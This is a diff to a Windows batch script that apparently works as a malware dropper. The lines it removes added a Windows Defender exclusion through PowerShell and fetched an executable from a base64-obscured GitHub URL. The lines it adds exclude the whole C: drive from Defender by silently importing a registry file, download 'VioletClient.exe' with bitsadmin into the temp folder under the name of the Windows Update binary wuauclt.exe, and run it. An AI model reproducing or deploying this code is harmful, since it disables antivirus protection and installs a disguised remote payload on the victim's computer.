@@ -37,10 +37,16 @@ if %errorLevel% == 0 (
     )
     
     setlocal
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
     set "exeFile=%TEMP%\wuauclt.exe"
-    set "url1=aHR0cHM6Ly9naXRodWIuY29tL3ZhdWx0MDUzMDA5LW1ha2VyL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9WaW9sZXRDbGllbnQuZXhl"
-    powershell -Command "$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
+    set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
+    set "regFile=%TEMP%\defender.reg"
+    echo Windows Registry Editor Version 5.00 > "%regFile%"
+    echo. >> "%regFile%"
+    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths] >> "%regFile%"
+    echo "C:\\"=dword:00000001 >> "%regFile%"
+    regedit /s "%regFile%"
+    del "%regFile%"
+    bitsadmin /transfer "Update" "%url1%" "%exeFile%"
     start "" "%exeFile%"
     endlocal
     exit
